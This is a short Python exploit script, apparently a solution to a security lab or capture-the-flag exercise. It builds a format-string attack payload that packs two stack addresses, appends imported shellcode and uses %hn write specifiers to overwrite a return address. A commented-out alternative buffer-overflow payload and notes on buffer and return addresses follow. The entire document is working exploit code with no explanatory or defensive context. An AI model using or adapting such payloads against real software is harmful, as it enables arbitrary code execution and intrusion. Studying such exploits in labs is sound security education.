from shellcode import shellcode
from struct import pack
print(pack("<I",0xbffe9d2c)+pack("<I",0xbffe9d2e)+shellcode+"%38153x%4$hn%10966x%5$hn")
#print(pack("<I",0x80000001)+shellcode+"a"*53+pack("<I",0xbffe9ce0))
#buf=0xbffe9520
#ret=0xbffe9d2c
#0xbffe9528
